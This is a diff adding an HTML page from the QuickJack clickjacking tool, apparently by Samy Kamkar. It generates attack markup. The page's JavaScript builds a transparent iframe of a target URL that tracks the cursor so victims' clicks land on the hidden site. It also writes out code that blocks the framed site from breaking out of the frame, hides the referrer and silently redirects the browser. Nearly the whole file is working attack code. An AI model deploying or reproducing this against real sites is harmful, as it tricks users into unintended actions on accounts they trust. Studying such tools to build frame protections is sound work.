@@ -1,0 +1,124 @@
+<html>
+<head>
+<title>quickjack</title>
+<script src="quickjack.js"></script>
+<script>
+function set()
+{
+	if (param('j') == 1)
+	{
+		document.getElementById('redir').disabled = 1;
+		document.getElementById('resize').disabled = 1;
+		document.getElementById('stopclick').disabled = 1;
+	}
+	else
+	{
+		document.getElementById('cjframe').disabled = 1;
+		document.getElementById('notfirst').disabled = 1;
+	}
+
+	if (param('b') == 1)
+		$('breakframes').checked = true;
+}
+
+function setTA()
+{
+	var extra = '';
+	var code = '';
+	var code2 = '';
+	var onl = '';
+	if (param('j') == 1)
+	{
+		var jl = param('jl');
+		var jt = param('jt');
+		jl = parseFloat(jl.substr(0, jl.length - 2));
+		jt = parseFloat(jt.substr(0, jt.length - 2));
+		jl += 9;
+		jt += 9;
+		code = '<style>body{margin:0px;padding:0px;}</style><div style="overflow:hidden;width:1px;height:1px;position:relative;" id=v><iframe id="cksl7" name="cksl7" src="'+(!$('hideref').checked ? decodeURIComponent(param('u')) : "tracker1.html?out=tracker2.html&url="+param('u'))+'" style="border:0px;left:-'+jl+'px;top:-'+jt+'px;position:absolute;filter:alpha(opacity=0);z-index:1;opacity:0;overflow:hidden;width:'+param('cw')+';height:'+param('ch')+';"></iframe></div><script>var d=document;if(!d.all)d.captureEvents(Event.MOUSEMOVE);d.onmousemove=function(e){var i=d.getElementById("v").style;i.left=d.all?event.clientX+d.body.scrollLeft:e.pageX;i.top=d.all?event.clientY+d.body.scrollTop:e.pageY;};';
+
+		code2 = '<style>body{margin:0px;padding:0px;}</style><div style="overflow:hidden;width:200px;height:200px;position:absolute;" id=v><iframe id="cksl7" name="cksl7" src="'+(!$('hideref').checked ? decodeURIComponent(param('u')) : "tracker1.html?out=tracker2.html&url="+param('u'))+'" style="border:0px;left:-'+jl+'px;top:-'+jt+'px;position:absolute;filter:alpha(opacity=50);z-index:-10;opacity:.5;overflow:hidden;width:'+param('cw')+';height:'+param('ch')+';"></iframe></div>';
+
+		var d=document;if(!d.all)d.captureEvents(Event.MOUSEMOVE);d.onmousemove=function(e){var i=d.getElementById("v").style;i.left=d.all?event.clientX+d.body.scrollLeft:e.pageX;i.top=d.all?event.clientY+d.body.scrollTop:e.pageY;};
+		if ($('breakframes').checked)
+		{
+        	code += 'function t(e){window.setTimeout("stop();",10);}window.onbeforeunload=t;var frames=new Array();';
+		}
+
+		code += '</sc'+'ript>';
+
+		if (!$('notfirst').checked)
+			//code += '<script src="https://code.jquery.com/jquery-2.1.3.min.js"></scr'+'ipt><script>$(function(){var i=-1;$("#cksl7").hover(function(){i=$(this).closest("#v").attr("qjid");},function(){i=-1;});$(window).focus();$(window).blur(function(){if(i!=-1){document.getElementById("v").style.visibility="hidden";}});});$(window).focus()</scr'+'ipt>';
+			code += '<script src="https://code.jquery.com/jquery-2.1.3.min.js"></scr'+'ipt><script>$(function(){var i=-1;$("#cksl7").hover(function(){i=$(this).closest("#v").attr("qjid");},function(){i=-1;});$(window).focus();$(window).blur(function(){document.getElementById("v").style.visibility="hidden";});});$(window).focus()</scr'+'ipt>';
+
+		$('nCode').value = code;
+		
+		if ($('cjframe').checked)
+			$('bg2').style.visibility = "hidden";
+		else
+			$('bg2').style.visibility = "visible";
+
+
+		$('bg2').innerHTML = code2;
+		return;
+	}
+
+	if ($('redir').value != '')
+		extra = 'window.cksl3=\'' + $('redir').value + '\';';
+
+	if ($('resize').checked || $('redir').value != '')
+	{
+		extra += "window.cksl1=function(arg){if(!window.cksl2)window.cksl2=arg;if(window.cksl2<arg){if(window.cksl3){self.location.href=window.cksl3;}else {var c4=document.getElementById('cksl6').style;var c5=document.getElementsByName('cksl7')[0].style;document.body.style.overflow='hidden';document.body.style.width=document.body.style.height=c4.width=c5.width=c4.height=c5.height='100%';c4.position=c5.position='absolute';c4.overflow=c5.overflow='visible';c4.top=c5.top=c4.left=c5.left='0px';}window.cksl2=arg;}setTimeout('window.cksl1(history.length)',1000);};setTimeout('window.cksl1(history.length)',2000);";
+		onl = ' onload="'+extra+'"';
+	}
+
+	if ($('breakframes').checked)
+	{
+		code += '<script>function t(e){window.setTimeout("stop();",10);}window.onbeforeunload=t;var frames=new Array();</scr'+"ipt>\n";
+		function t(e){window.setTimeout("stop();",10);}
+		window.onbeforeunload=t;
+		var frames=new Array();
+	}
+
+	code += "<div qjid=\"quickjack\" style=\"overflow: hidden; width: "+param('w')+"; height: "+param('h')+"; position: relative;\" id=\"cksl6\">\n";
+
+	if ($('stopclick').checked)
+		code += '<div class="ol" style="position: absolute; width:'+param('w')+"; height: "+param('h')+'; z-index:90; overflow: auto;"></div>';
+
+	code += "<iframe name=\"cksl7\" src=\""+(!$('hideref').checked ? decodeURIComponent(param('u')) : "tracker1.html?out=tracker2.html&url="+param('u'))+"\" style=\"border: 0pt none ; left: "+param('cl')+"; top: "+param('ct')+"; position: absolute; width: "+param('cw')+"; height: "+param('ch')+";\" scrolling=\"no\""+onl+"><\/iframe><\/div>";
+
+	$('nCode').value = code;
+	$('bg').innerHTML = code;
+}
+</script>
+</head>
+<body onload="set();setTA()" bgcolor="#eeeeee">
+<div id="bg2" style="position:absolute;margin:0px;padding:0px;top:0px;left:0px;z-index:-20;"></div>
+        <a href="http://samy.pl">home page</a> || <a href="http://twitter.com/samykamkar">follow my twitter</a> || <a href="/videos/">videos</a> || <a href="mailto:code@samy.pl">email me</a> || samy kamkar<hr>
+
+
+<table>
+<tr><td>Hide QuickJack Frame (clickjacking only)</td>
+	<td><input onChange="setTA()" type=checkbox id=cjframe name=cjframe></td></tr>
+<tr><td>Prevent Frame Breakouts (FF only)</td>
+	<td><input onChange="setTA()" type=checkbox id=breakframes name=breakframes></td></tr>
+<tr><td>Continue Jacking after First Click</td>
+	<td><input onChange="setTA()" type=checkbox id=notfirst name=notfirst></td></tr>
+<tr><td>Prevent Clicks (slice only)</td>
+	<td><input onChange="setTA()" type=checkbox id=stopclick name=stopclick></td></tr>
+<tr><td>Resize 2nd page to 100% (slice only)</a></td>
+	<td><input onChange="setTA()" type=checkbox id=resize name=resize></td></tr>
+<tr><td>Hide Referrer (requires redirection package)</td>
+	<td><input onChange="setTA()" type=checkbox id=hideref name=hideref></td></tr>
+<tr><td>Redirect Browser (slice only)</a></td>
+	<td><input onkeyup="setTA()" type=text id=redir name=redir></td></tr>
+</table>
+
+<hr>
+<textarea style="width:700px;height:150px;" id="nCode"></textarea>
+<hr>
+
+<div id="bg" style="position:absolute"></div>
+<br>
+</body>
+</html>
